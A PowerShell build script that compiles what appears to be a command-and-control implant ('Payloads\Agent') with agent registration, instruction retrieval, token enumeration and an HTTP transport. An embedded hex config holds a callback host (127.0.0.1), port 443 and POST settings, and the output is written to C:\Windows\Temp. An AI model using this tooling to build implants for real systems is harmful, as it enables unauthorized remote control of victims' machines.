# Define the paths for the compiler and the SDK/Visual Studio
$compilerPath = 'C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\bin\Hostx64\x64\cl.exe'
$windowsSdkInclude = 'C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0' # Update this path if different
$vsInclude = 'C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Tools\MSVC\14.38.33130\include' # Update this path if different

# Define the source files
$sourceFiles = @(
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\agent\RegisterAgent.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\agent\agent.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\agent\init.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\Crypt\Crypto.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\cstdreplacement\localcstd.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\Enumeration\enum.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\Enumeration\token.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\Helpers\parsekey.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\Http\PerformRequest.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\Http\RetrieveInstructions.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\Package\package.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\aes.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\asn.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\coding.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\cryptocb.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\des3.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\dh.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\dsa.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\error.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\hash.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\hmac.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\logging.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\md2.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\md5.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\memory.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\misc.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\pkcs12.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\pwdbased.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\random.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\rc2.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\rsa.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\sha.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\sha256.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\sp_int.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\wc_encrypt.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\wc_port.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\wolfssl\wolfmath.c',
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\src\main\main.c'
)

# Define the include directories
$includeDirs = @(
    'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\include',
	'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\include\wolfssl'
	"$windowsSdkInclude\um",
    "$windowsSdkInclude\shared",
    "$windowsSdkInclude\winrt",
    "$vsInclude"
    #'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\include\wolfssl\openssl',
    #'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\include\wolfssl\wolfcrypt',
    #'C:\Users\Brendan Ortiz\Documents\GOProjcets\AllSecure\Payloads\Agent\include\wolfssl\wolfssl'
)

# Define the compilation arguments
$compileArgs = @(
    '/O2',
    '/GS-',
    '/Zc:inline',
    '/fp:fast',
    '/Zl',
    '/D CONFIG_BYTES={0xe8,0x03,0x00,0x00,0x0a,0x00,0x00,0x00,0x80,0x99,0xcf,0x61,0x00,0x00,0x00,0x00,0x40,0x04,0x50,0x00,0x0a,0x00,0x00,0x00,0x50,0x00,0x4f,0x00,0x53,0x00,0x54,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x31,0x00,0x32,0x00,0x37,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x31,0x00,0x00,0x00,0xbb,0x01,0x00,0x00,0x10,0x00,0x00,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x00,0x00,0xbb,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x18,0x00,0x00,0x70,0x00,0x70,0x00,0x6c,0x00,0x69,0x00,0x63,0x00,0x61,0x00,0x74,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x2f,0x00,0x6a,0x00,0x73,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x48,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x3a,0x00,0x20,0x00,0x31,0x00,0x32,0x00,0x37,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x31,0x00,0x00,0x00}',
    '/D TRANSPORT_HTTP',
    '/D MAIN_THREADED',
    '/FeC:\Windows\Temp\Payloads\Agent.exe'
)

# Define the linker arguments
$linkArgs = @(
    '/link',
    '/opt:ref',
    '/opt:icf',
    '/merge:.rdata=.text',
    '/merge:.data=.text',
    '/nodefaultlib',
    '/incremental:no',
    '/subsystem:console',
    '/entry:mainCRTStartup'
)

# Combine all arguments
$arguments = $sourceFiles + $includeDirs.ForEach({ "/I$_" }) + $compileArgs + $linkArgs

# Run the compiler with the specified arguments
& $compilerPath $arguments
